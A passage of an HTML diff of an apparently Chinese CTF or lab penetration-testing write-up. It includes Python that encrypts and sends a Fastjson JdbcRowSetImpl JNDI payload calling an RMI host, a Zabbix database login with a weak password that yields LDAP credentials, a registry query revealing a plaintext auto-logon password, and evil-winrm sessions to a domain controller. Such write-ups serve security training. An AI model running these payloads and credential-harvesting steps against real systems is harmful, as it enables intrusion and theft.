+    <span class="pl-s1">ciphertext</span> <span class="pl-c1">=</span> <span class="pl-s1">encryptor</span>.<span class="pl-c1">update</span>(<span class="pl-s1">plaintext</span>.<span class="pl-c1">encode</span>(<span class="pl-s">"utf-8"</span>))
+    <span class="pl-s1">ciphertext</span> <span class="pl-c1">+=</span> <span class="pl-s1">encryptor</span>.<span class="pl-c1">finalize</span>()
+    <span class="pl-s1">tag</span> <span class="pl-c1">=</span> <span class="pl-s1">encryptor</span>.<span class="pl-c1">tag</span>
 
-    print(f"加密后的密文长度: {len(ciphertext)} 字节")
-    print(f"GCM 认证标签长度: {len(tag)} 字节")
+    <span class="pl-en">print</span>(<span class="pl-s">f"加密后的密文长度: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">len</span>(<span class="pl-s1">ciphertext</span>)<span class="pl-kos">}</span></span> 字节"</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">f"GCM 认证标签长度: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">len</span>(<span class="pl-s1">tag</span>)<span class="pl-kos">}</span></span> 字节"</span>)
 
-    # 构建请求体: IV + 密文 + GCM 标签
-    request_body = iv + ciphertext + tag
-    request_body_b64 = base64.b64encode(request_body).decode("utf-8")
-    print(f"Base64 编码后的请求体长度: {len(request_body_b64)} 字符")
+    <span class="pl-c"># 构建请求体: IV + 密文 + GCM 标签</span>
+    <span class="pl-s1">request_body</span> <span class="pl-c1">=</span> <span class="pl-s1">iv</span> <span class="pl-c1">+</span> <span class="pl-s1">ciphertext</span> <span class="pl-c1">+</span> <span class="pl-s1">tag</span>
+    <span class="pl-s1">request_body_b64</span> <span class="pl-c1">=</span> <span class="pl-s1">base64</span>.<span class="pl-c1">b64encode</span>(<span class="pl-s1">request_body</span>).<span class="pl-c1">decode</span>(<span class="pl-s">"utf-8"</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">f"Base64 编码后的请求体长度: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">len</span>(<span class="pl-s1">request_body_b64</span>)<span class="pl-kos">}</span></span> 字符"</span>)
 
-    # ===== 4. 使用 RSA 公钥加密 AES 密钥 =====
-    public_key_bytes = base64.b64decode(PUBLIC_KEY_B64)
-    public_key = serialization.load_der_public_key(
-        public_key_bytes,
-        backend=default_backend()
+    <span class="pl-c"># ===== 4. 使用 RSA 公钥加密 AES 密钥 =====</span>
+    <span class="pl-s1">public_key_bytes</span> <span class="pl-c1">=</span> <span class="pl-s1">base64</span>.<span class="pl-c1">b64decode</span>(<span class="pl-v">PUBLIC_KEY_B64</span>)
+    <span class="pl-s1">public_key</span> <span class="pl-c1">=</span> <span class="pl-s1">serialization</span>.<span class="pl-c1">load_der_public_key</span>(
+        <span class="pl-s1">public_key_bytes</span>,
+        <span class="pl-s1">backend</span><span class="pl-c1">=</span><span class="pl-en">default_backend</span>()
     )
 
-    encrypted_aes_key = public_key.encrypt(
-        aes_key,
-        padding.PKCS1v15()
+    <span class="pl-s1">encrypted_aes_key</span> <span class="pl-c1">=</span> <span class="pl-s1">public_key</span>.<span class="pl-c1">encrypt</span>(
+        <span class="pl-s1">aes_key</span>,
+        <span class="pl-s1">padding</span>.<span class="pl-c1">PKCS1v15</span>()
     )
 
-    encrypted_key_b64 = base64.b64encode(encrypted_aes_key).decode("utf-8")
-    print(f"RSA 加密后的 AES 密钥长度: {len(encrypted_aes_key)} 字节")
-    print(f"Base64 编码后的加密密钥: {encrypted_key_b64[:50]}...")
+    <span class="pl-s1">encrypted_key_b64</span> <span class="pl-c1">=</span> <span class="pl-s1">base64</span>.<span class="pl-c1">b64encode</span>(<span class="pl-s1">encrypted_aes_key</span>).<span class="pl-c1">decode</span>(<span class="pl-s">"utf-8"</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">f"RSA 加密后的 AES 密钥长度: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">len</span>(<span class="pl-s1">encrypted_aes_key</span>)<span class="pl-kos">}</span></span> 字节"</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">f"Base64 编码后的加密密钥: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">encrypted_key_b64</span>[:<span class="pl-c1">50</span>]<span class="pl-kos">}</span></span>..."</span>)
 
-    # ===== 5. 构建请求头并发送 POST 请求 =====
-    headers = {
-        "Content-Type": "application/octet-stream",
-        "X-Encrypted-Key": encrypted_key_b64,
+    <span class="pl-c"># ===== 5. 构建请求头并发送 POST 请求 =====</span>
+    <span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
+        <span class="pl-s">"Content-Type"</span>: <span class="pl-s">"application/octet-stream"</span>,
+        <span class="pl-s">"X-Encrypted-Key"</span>: <span class="pl-s1">encrypted_key_b64</span>,
     }
 
-    print("-" * 50)
-    print("正在发送请求...")
-    print(f"目标地址: {SERVER_URL}")
-    print(f"请求头: {headers}")
+    <span class="pl-en">print</span>(<span class="pl-s">"-"</span> <span class="pl-c1">*</span> <span class="pl-c1">50</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">"正在发送请求..."</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">f"目标地址: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">SERVER_URL</span><span class="pl-kos">}</span></span>"</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">f"请求头: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">headers</span><span class="pl-kos">}</span></span>"</span>)
 
-    try:
-        response = requests.post(
-            SERVER_URL,
-            data=request_body_b64.encode("utf-8"),
-            headers=headers,
-            timeout=10
+    <span class="pl-k">try</span>:
+        <span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(
+            <span class="pl-c1">SERVER_URL</span>,
+            <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">request_body_b64</span>.<span class="pl-c1">encode</span>(<span class="pl-s">"utf-8"</span>),
+            <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>,
+            <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">10</span>
         )
 
-        print("-" * 50)
-        print(f"响应状态码: {response.status_code}")
-        print(f"响应内容: {response.text}")
+        <span class="pl-en">print</span>(<span class="pl-s">"-"</span> <span class="pl-c1">*</span> <span class="pl-c1">50</span>)
+        <span class="pl-en">print</span>(<span class="pl-s">f"响应状态码: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">response</span>.<span class="pl-c1">status_code</span><span class="pl-kos">}</span></span>"</span>)
+        <span class="pl-en">print</span>(<span class="pl-s">f"响应内容: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">response</span>.<span class="pl-c1">text</span><span class="pl-kos">}</span></span>"</span>)
 
-    except requests.exceptions.Timeout:
-        print("请求超时")
-    except requests.exceptions.ConnectionError:
-        print("连接错误，请检查网络或服务器地址")
-    except Exception as e:
-        print(f"请求发生异常: {str(e)}")
+    <span class="pl-k">except</span> <span class="pl-s1">requests</span>.<span class="pl-c1">exceptions</span>.<span class="pl-c1">Timeout</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">"请求超时"</span>)
+    <span class="pl-k">except</span> <span class="pl-s1">requests</span>.<span class="pl-c1">exceptions</span>.<span class="pl-c1">ConnectionError</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">"连接错误，请检查网络或服务器地址"</span>)
+    <span class="pl-k">except</span> <span class="pl-v">Exception</span> <span class="pl-k">as</span> <span class="pl-s1">e</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">f"请求发生异常: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">str</span>(<span class="pl-s1">e</span>)<span class="pl-kos">}</span></span>"</span>)
 
 
-if __name__ == "__main__":
-    main()
-</code></pre>
+<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
+    <span class="pl-en">main</span>()</pre></div>
 <p>发包接shell</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test/ccb]
-└─# pc python3 ez.py
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test/ccb]
+└─<span class="pl-c"><span class="pl-c">#</span> pc python3 ez.py</span>
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
 待加密的 JSON 数据:
 {
-        "@type": "com.sun.rowset.JdbcRowSetImpl",
-        "dataSourceName": "rmi://172.16.22.12:1099/zeeje2",
-        "autoCommit": true
+        <span class="pl-s"><span class="pl-pds">"</span>@type<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>com.sun.rowset.JdbcRowSetImpl<span class="pl-pds">"</span></span>,
+        <span class="pl-s"><span class="pl-pds">"</span>dataSourceName<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>rmi://172.16.22.12:1099/zeeje2<span class="pl-pds">"</span></span>,
+        <span class="pl-s"><span class="pl-pds">"</span>autoCommit<span class="pl-pds">"</span></span>: <span class="pl-c1">true</span>
     }
 --------------------------------------------------
 生成的 AES 密钥长度: 16 字节
@@ -695,30 +685,27 @@ Base64 编码后的加密密钥: HGg+xAo8KgrsBxxLqNkGVSgmAN+Cq6e4m68KAI10soWo8XL
 --------------------------------------------------
 正在发送请求...
 目标地址: http://172.16.22.88:8080/api/login
-请求头: {'Content-Type': 'application/octet-stream', 'X-Encrypted-Key': 'HGg+xAo8KgrsBxxLqNkGVSgmAN+Cq6e4m68KAI10soWo8XLcTC3rLOHXwAzgvrq8QGB97Bxm8FpK5qxlTvoRSeb4PMStJOQWEMdY8TfrrUSco2ZwjSTF6tE9W8RX3AMZVqC6luGlwGl5NUdopkZUBS2ta0UGWY53HHthjMedbpT4bdCTUP4sJeTEwuPu5f5+WeqNILAk8RncWfbeeX4h7T3FN+XqkPIjHS7wsAAbdeUlF/F/twMlVJgzvtwePuwjUDD5fY0c412QEMtdGoNUdZ8NLK6uuqDWCoZ5ImajhQumuX1res8fDlAkEPxyeuO04s2+/baIKEq7pAJvw+yf/g=='}
+请求头: {<span class="pl-s"><span class="pl-pds">'</span>Content-Type<span class="pl-pds">'</span></span>: <span class="pl-s"><span class="pl-pds">'</span>application/octet-stream<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>X-Encrypted-Key<span class="pl-pds">'</span></span>: <span class="pl-s"><span class="pl-pds">'</span>HGg+xAo8KgrsBxxLqNkGVSgmAN+Cq6e4m68KAI10soWo8XLcTC3rLOHXwAzgvrq8QGB97Bxm8FpK5qxlTvoRSeb4PMStJOQWEMdY8TfrrUSco2ZwjSTF6tE9W8RX3AMZVqC6luGlwGl5NUdopkZUBS2ta0UGWY53HHthjMedbpT4bdCTUP4sJeTEwuPu5f5+WeqNILAk8RncWfbeeX4h7T3FN+XqkPIjHS7wsAAbdeUlF/F/twMlVJgzvtwePuwjUDD5fY0c412QEMtdGoNUdZ8NLK6uuqDWCoZ5ImajhQumuX1res8fDlAkEPxyeuO04s2+/baIKEq7pAJvw+yf/g==<span class="pl-pds">'</span></span>}
 --------------------------------------------------
 响应状态码: 400
-响应内容: Decrypted data is not valid JSON or empty
-</code></pre>
+响应内容: Decrypted data is not valid JSON or empty</pre></div>
 <h2>flag3</h2>
-<pre lang="bash" class="notranslate"><code class="notranslate">root@AppServer:/# cat /flag
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@AppServer:/<span class="pl-c"><span class="pl-c">#</span> cat /flag</span>
 cat /flag
-flag{5814d11a-d4b2-866e-28ab-c788e3a063b2}
-</code></pre>
+flag{5814d11a-d4b2-866e-28ab-c788e3a063b2}</pre></div>
 <h2>172.16.22.41</h2>
 <p>这个说是域渗透其实感觉涉及的知识不多，而且很基础<br>
 这台是DC，在172.16.22.14其实还可以发现域用户ldapadmin</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a4dfddcb-80eb-4346-bfb0-63b0e510e4fa"><img width="1666" height="612" alt="Image" src="https://github.com/user-attachments/assets/a4dfddcb-80eb-4346-bfb0-63b0e510e4fa" style="max-width: 100%; height: auto; max-height: 612px;"></a></p>
 <p>zabbix的数据库连接信息存在<code class="notranslate">/etc/zabbix/zabbix_server.conf</code>中<br>
 域用户信息存在userdirectory_ldap表中，不过是没权限读的，s位的ss也只能读第一行</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">zabbix@zabbix:/tmp$ ls -al /etc/zabbix/zabbix_server.conf
--rw------- 1 root root 31264 Sep  3 13:47 /etc/zabbix/zabbix_server.conf
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">zabbix@zabbix:/tmp$ ls -al /etc/zabbix/zabbix_server.conf
+-rw------- 1 root root 31264 Sep  3 13:47 /etc/zabbix/zabbix_server.conf</pre></div>
 <p>不过这里是弱密码</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">zabbix@zabbix:/tmp$ mysql -uzabbix -ppassword
+<div class="highlight highlight-source-shell"><pre class="notranslate">zabbix@zabbix:/tmp$ mysql -uzabbix -ppassword
 
-mysql&gt; select * from userdirectory_ldap \G;
-*************************** 1. row ***************************
+mysql<span class="pl-k">&gt;</span> <span class="pl-k">select</span> <span class="pl-smi">*</span> from userdirectory_ldap <span class="pl-cce">\G</span><span class="pl-k">;</span>
+<span class="pl-k">***************************</span> 1. row <span class="pl-k">***************************</span>
  userdirectoryid: 1
             host: 172.16.22.41
             port: 389
@@ -736,77 +723,74 @@ search_attribute: sAMAccountName
 group_membership: memberOf
    user_username:
    user_lastname:
-1 row in set (0.00 sec)
-</code></pre>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/ccb]
-└─# pc evil-winrm -i 172.16.22.41 -u ldapadmin -p XpVLGkQHm8
+1 row <span class="pl-k">in</span> <span class="pl-c1">set</span> (0.00 sec)</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/ccb]
+└─<span class="pl-c"><span class="pl-c">#</span> pc evil-winrm -i 172.16.22.41 -u ldapadmin -p XpVLGkQHm8</span>
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
 
 Evil-WinRM shell v3.7
 
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\ldapadmin\Documents&gt; reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
-    AutoRestartShell    REG_DWORD    0x1
-    Background    REG_SZ    0 0 0
-    CachedLogonsCount    REG_SZ    10
-    DebugServerCommand    REG_SZ    no
-    DisableBackButton    REG_DWORD    0x1
-    ForceUnlockLogon    REG_DWORD    0x0
-    LegalNoticeCaption    REG_SZ
-    LegalNoticeText    REG_SZ
-    PasswordExpiryWarning    REG_DWORD    0x5
-    PowerdownAfterShutdown    REG_SZ    0
-    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
-    ReportBootOk    REG_SZ    1
-    Shell    REG_SZ    explorer.exe
-    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
-    ShellCritical    REG_DWORD    0x0
-    ShellInfrastructure    REG_SZ    sihost.exe
-    SiHostCritical    REG_DWORD    0x0
-    SiHostReadyTimeOut    REG_DWORD    0x0
-    SiHostRestartCountLimit    REG_DWORD    0x0
-    SiHostRestartTimeGap    REG_DWORD    0x0
-    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
-    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
-    WinStationsDisabled    REG_SZ    0
-    EnableSIHostIntegration    REG_DWORD    0x1
-    scremoveoption    REG_SZ    0
-    DisableCAD    REG_DWORD    0x1
-    LastLogOffEndTimePerfCounter    REG_QWORD    0x36aa8b5e
-    ShutdownFlags    REG_DWORD    0x7
-    AutoLogonSID    REG_SZ    S-1-5-21-623508419-3032997920-3505136064-500
-    LastUsedUsername    REG_SZ    Administrator
-    DisableLockWorkstation    REG_DWORD    0x0
-    DefaultDomainName    REG_SZ    ZWFW
-    DefaultUserName    REG_SZ    administrator
-    AutoAdminLogon    REG_SZ    1
-    DefaultPassword    REG_SZ    a4Z6FcRYSp6LLSGO
-</code></pre>
+Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="pl-s"><span class="pl-pds">`</span>quoting_detection_proc<span class="pl-s"><span class="pl-pds">'</span> for module Reline</span></span>
+<span class="pl-s"><span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></span>
+<span class="pl-s"><span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s">Info: Establishing connection to remote endpoint</span></span>
+<span class="pl-s"><span class="pl-s">*Evil-WinRM* PS C:\Users\ldapadmin\Documents&gt; reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span></span>
+<span class="pl-s"><span class="pl-s">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span></span>
+<span class="pl-s"><span class="pl-s">    AutoRestartShell    REG_DWORD    0x1</span></span>
+<span class="pl-s"><span class="pl-s">    Background    REG_SZ    0 0 0</span></span>
+<span class="pl-s"><span class="pl-s">    CachedLogonsCount    REG_SZ    10</span></span>
+<span class="pl-s"><span class="pl-s">    DebugServerCommand    REG_SZ    no</span></span>
+<span class="pl-s"><span class="pl-s">    DisableBackButton    REG_DWORD    0x1</span></span>
+<span class="pl-s"><span class="pl-s">    ForceUnlockLogon    REG_DWORD    0x0</span></span>
+<span class="pl-s"><span class="pl-s">    LegalNoticeCaption    REG_SZ</span></span>
+<span class="pl-s"><span class="pl-s">    LegalNoticeText    REG_SZ</span></span>
+<span class="pl-s"><span class="pl-s">    PasswordExpiryWarning    REG_DWORD    0x5</span></span>
+<span class="pl-s"><span class="pl-s">    PowerdownAfterShutdown    REG_SZ    0</span></span>
+<span class="pl-s"><span class="pl-s">    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}</span></span>
+<span class="pl-s"><span class="pl-s">    ReportBootOk    REG_SZ    1</span></span>
+<span class="pl-s"><span class="pl-s">    Shell    REG_SZ    explorer.exe</span></span>
+<span class="pl-s"><span class="pl-s">    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe</span></span>
+<span class="pl-s"><span class="pl-s">    ShellCritical    REG_DWORD    0x0</span></span>
+<span class="pl-s"><span class="pl-s">    ShellInfrastructure    REG_SZ    sihost.exe</span></span>
+<span class="pl-s"><span class="pl-s">    SiHostCritical    REG_DWORD    0x0</span></span>
+<span class="pl-s"><span class="pl-s">    SiHostReadyTimeOut    REG_DWORD    0x0</span></span>
+<span class="pl-s"><span class="pl-s">    SiHostRestartCountLimit    REG_DWORD    0x0</span></span>
+<span class="pl-s"><span class="pl-s">    SiHostRestartTimeGap    REG_DWORD    0x0</span></span>
+<span class="pl-s"><span class="pl-s">    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,</span></span>
+<span class="pl-s"><span class="pl-s">    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile</span></span>
+<span class="pl-s"><span class="pl-s">    WinStationsDisabled    REG_SZ    0</span></span>
+<span class="pl-s"><span class="pl-s">    EnableSIHostIntegration    REG_DWORD    0x1</span></span>
+<span class="pl-s"><span class="pl-s">    scremoveoption    REG_SZ    0</span></span>
+<span class="pl-s"><span class="pl-s">    DisableCAD    REG_DWORD    0x1</span></span>
+<span class="pl-s"><span class="pl-s">    LastLogOffEndTimePerfCounter    REG_QWORD    0x36aa8b5e</span></span>
+<span class="pl-s"><span class="pl-s">    ShutdownFlags    REG_DWORD    0x7</span></span>
+<span class="pl-s"><span class="pl-s">    AutoLogonSID    REG_SZ    S-1-5-21-623508419-3032997920-3505136064-500</span></span>
+<span class="pl-s"><span class="pl-s">    LastUsedUsername    REG_SZ    Administrator</span></span>
+<span class="pl-s"><span class="pl-s">    DisableLockWorkstation    REG_DWORD    0x0</span></span>
+<span class="pl-s"><span class="pl-s">    DefaultDomainName    REG_SZ    ZWFW</span></span>
+<span class="pl-s"><span class="pl-s">    DefaultUserName    REG_SZ    administrator</span></span>
+<span class="pl-s"><span class="pl-s">    AutoAdminLogon    REG_SZ    1</span></span>
+<span class="pl-s"><span class="pl-s">    DefaultPassword    REG_SZ    a4Z6FcRYSp6LLSGO</span></span></pre></div>
 <p>这里特意设置了自动登录，密码明文就直接存着，administrator直接登就行</p>
 <h2>flag4</h2>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/ccb]
-└─# pc evil-winrm -i 172.16.22.41 -u administrator -p a4Z6FcRYSp6LLSGO
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/ccb]
+└─<span class="pl-c"><span class="pl-c">#</span> pc evil-winrm -i 172.16.22.41 -u administrator -p a4Z6FcRYSp6LLSGO</span>
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
 
 Evil-WinRM shell v3.7
 
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/flag.txt
-flag{5af3b42d-ce27-4a6f-9037-29d81346310a}
-</code></pre></div>
+Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="pl-s"><span class="pl-pds">`</span>quoting_detection_proc<span class="pl-s"><span class="pl-pds">'</span> for module Reline</span></span>
+<span class="pl-s"><span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></span>
+<span class="pl-s"><span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s">Info: Establishing connection to remote endpoint</span></span>
+<span class="pl-s"><span class="pl-s">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/flag.txt</span></span>
+<span class="pl-s"><span class="pl-s">flag{5af3b42d-ce27-4a6f-9037-29d81346310a}</span></span></pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -831,7 +815,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 